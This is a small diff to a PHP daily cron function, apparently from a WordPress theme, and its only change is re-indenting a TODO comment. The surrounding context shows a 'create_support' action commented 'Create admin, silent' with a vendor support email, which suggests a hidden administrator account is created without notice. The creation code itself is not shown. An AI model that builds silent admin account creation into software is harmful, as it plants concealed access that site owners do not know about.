@@ -103,7 +103,7 @@ function madeit_cron_daily()
             if ($action['action'] === 'update_theme') {
                 // Update theme
                 $theme = 'madeit';
-            //TODO update theme
+                //TODO update theme
             } elseif ($action['action'] === 'create_support') {
                 // Create admin, silent
                 $email = 'support@madeit.be';
